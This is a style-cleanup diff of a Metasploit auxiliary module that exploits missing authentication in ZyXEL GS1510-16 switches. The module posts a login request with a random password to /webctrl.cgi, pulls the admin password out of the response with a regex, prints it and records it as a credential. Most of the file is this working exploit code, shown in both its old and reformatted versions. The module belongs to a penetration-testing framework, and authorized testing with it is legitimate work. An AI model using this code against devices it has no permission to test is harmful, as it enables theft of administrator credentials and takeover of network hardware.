@@ -1,3 +1,4 @@
+# frozen_string_literal: true
 ##
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
@@ -6,21 +7,20 @@
 require 'msf/core'
 
 class MetasploitModule < Msf::Auxiliary
-
   include Msf::Auxiliary::Report
   include Msf::Exploit::Remote::HttpClient
 
   def initialize
     super(
       'Name'        => 'ZyXEL GS1510-16 Password Extractor',
-      'Description' => %q{
+      'Description' => %q(
           This module exploits a vulnerability in ZyXEL GS1510-16 routers
           to extract the admin password. Due to a lack of authentication on the
           webctrl.cgi script, unauthenticated attackers can recover the
           administrator password for these devices. The vulnerable device
           has reached end of life for support from the manufacturer, so it is
           unlikely this problem will be addressed.
-      },
+      ),
       'References'  =>
         [
           [ 'URL', 'https://github.com/rapid7/metasploit-framework/pull/2709' ]
@@ -29,7 +29,7 @@ class MetasploitModule < Msf::Auxiliary
         'Daniel Manser', # @antsygeek
         'Sven Vetsch' # @disenchant_ch
       ],
-      'License'     => MSF_LICENSE
+      'License' => MSF_LICENSE
     )
   end
 
@@ -63,16 +63,16 @@ class MetasploitModule < Msf::Auxiliary
     begin
     print_status("Trying to get 'admin' user password ...")
     res = send_request_cgi({
-      'uri'       => "/webctrl.cgi",
-      'method'    => 'POST',
-      'vars_post' => {
-        'username' => "admin",
-        'password' => "#{Rex::Text.rand_text_alphanumeric(rand(4)+4)}",
-        'action' => "cgi_login"
-      }
-    }, 10)
+                             'uri' => "/webctrl.cgi",
+                             'method'    => 'POST',
+                             'vars_post' => {
+                               'username' => "admin",
+                               'password' => Rex::Text.rand_text_alphanumeric(rand(4) + 4).to_s,
+                               'action' => "cgi_login"
+                             }
+                           }, 10)
 
-    if (res && res.code == 200)
+    if res && res.code == 200
       print_status("Got response from router.")
     else
       print_error('Unexpected HTTP response code.')
@@ -80,13 +80,13 @@ class MetasploitModule < Msf::Auxiliary
     end
 
     admin_password = ""
-    admin_password_matches = res.body.match(/show_user\(1,"admin","(.+)"/);
+    admin_password_matches = res.body.match(/show_user\(1,"admin","(.+)"/)
 
-    if not admin_password_matches
+    if !admin_password_matches
       print_error('Could not obtain admin password')
       return
     else
-      admin_password = admin_password_matches[1];
+      admin_password = admin_password_matches[1]
       print_good("Password for user 'admin' is: #{admin_password}")
 
       report_cred(
